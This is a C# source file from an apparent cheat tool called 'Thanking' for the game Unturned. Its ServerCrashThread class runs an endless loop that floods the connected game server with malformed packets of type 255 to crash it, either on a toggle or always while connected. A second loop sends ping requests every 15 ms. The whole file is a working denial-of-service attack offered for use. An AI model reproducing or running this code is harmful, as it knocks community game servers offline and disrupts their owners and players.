using System.Linq;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Overrides;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class ServerCrashThread
    {
        public static bool ServerCrashEnabled;
        public static bool AlwaysCrash;
        
        [Thread]
        public static void Start()
        {
            Provider.onClientDisconnected += () =>
            {
                ServerCrashEnabled = false;
                OV_Provider.IsConnected = false;
            };

            while (true)
            {
                if (ServerCrashEnabled || (AlwaysCrash && OV_Provider.IsConnected))
                    Provider.send(Provider.server, (ESteamPacket)255, new byte[0], 1, 0);
                else
                    Thread.Sleep(1000);
            }
        }

        [Thread]
        public static void PingCheck()
        {
            while (true)
            {
                Thread.Sleep(15);
                
                if (!OV_Provider.IsConnected)
                    continue;
                
                Provider.send(Provider.server, ESteamPacket.PING_REQUEST, new byte[]
                {
                    13
                }, 1, 0);
            }
        }
    }
}
